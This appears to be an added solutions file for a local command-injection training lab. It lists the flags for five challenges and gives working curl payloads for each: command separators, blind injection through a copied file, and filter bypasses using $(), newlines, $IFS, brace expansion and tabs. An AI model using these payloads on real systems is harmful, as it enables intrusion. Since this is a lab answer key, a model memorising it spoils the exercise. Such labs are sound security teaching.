@@ -1,0 +1,88 @@
+===============================================================================
+  NeonPing — Command Injection Lab Solutions (Port 5011)
+===============================================================================
+
+CHALLENGE 1: Basic Command Injection
+Flag: FLAG{cmd1_b4s1c_1nj3ct}
+
+  The /ping endpoint passes user input directly to os.popen():
+    os.popen(f"ping -c 1 {host}")
+
+  Inject a command separator:
+
+  curl "http://localhost:5011/ping?host=127.0.0.1;cat+/app/flag.txt"
+
+  Alternative payloads:
+    ?host=127.0.0.1|cat /app/flag.txt
+    ?host=$(cat /app/flag.txt)
+    ?host=`cat /app/flag.txt`
+    ?host=127.0.0.1%0acat /app/flag.txt   (URL-encoded newline)
+
+-------------------------------------------------------------------------------
+
+CHALLENGE 2: Blind Command Injection
+Flag: FLAG{cmd1_bl1nd_t1m3}
+
+  The /dns-check endpoint runs nslookup but only returns "success" or
+  "failed" — the actual output is hidden. Exfiltrate by writing to a file:
+
+  curl -X POST http://localhost:5011/dns-check \
+    -d "domain=example.com;cp+/app/flag2.txt+/app/static/out.txt"
+
+  Then read the exfiltrated file:
+  curl http://localhost:5011/static/out.txt
+
+  Alternative — time-based detection:
+  curl -X POST http://localhost:5011/dns-check -d "domain=example.com;sleep+5"
+  (Response delayed by 5 seconds confirms injection)
+
+-------------------------------------------------------------------------------
+
+CHALLENGE 3: Filter Bypass — $() Substitution
+Flag: FLAG{cmd1_f1lt3r_byp4ss}
+
+  The /ping-safe endpoint blocks: ; | & ` (semicolons, pipes, ampersands,
+  backticks). But it does NOT block $() command substitution or newlines.
+
+  curl "http://localhost:5011/ping-safe?host=127.0.0.1\$(cat+/app/flag3.txt)"
+
+  Alternative — URL-encoded newline:
+  curl "http://localhost:5011/ping-safe?host=127.0.0.1%0acat+/app/flag3.txt"
+
+-------------------------------------------------------------------------------
+
+CHALLENGE 4: $IFS Bypass for Spaces
+Flag: FLAG{cmd1_1fs_byp4ss}
+
+  The /traceroute endpoint blocks ; and | but not $IFS (Internal Field
+  Separator), which acts as a space in bash.
+
+  curl -X POST http://localhost:5011/traceroute \
+    -d "host=127.0.0.1%0acat\$IFS/app/flag4.txt"
+
+  Alternative:
+    host=127.0.0.1$(cat${IFS}/app/flag4.txt)
+
+  $IFS defaults to space+tab+newline, so cat${IFS}/app/flag4.txt
+  is equivalent to "cat /app/flag4.txt".
+
+-------------------------------------------------------------------------------
+
+CHALLENGE 5: Space Bypass — Brace Expansion
+Flag: FLAG{cmd1_sp4c3_byp4ss}
+
+  The /whois endpoint blocks whitespace characters via regex (\s).
+  Bypass with brace expansion or $IFS:
+
+  # Brace expansion (no spaces needed):
+  curl "http://localhost:5011/whois?domain=example.com%0a{cat,/app/flag5.txt}"
+
+  # $IFS as space replacement:
+  curl "http://localhost:5011/whois?domain=example.com%0acat\$IFS/app/flag5.txt"
+
+  # Tab character (may not be caught by \s in all regex modes):
+  curl "http://localhost:5011/whois?domain=example.com%0acat%09/app/flag5.txt"
+
+  Note: %0a is URL-encoded newline to start a new command line.
+
+===============================================================================
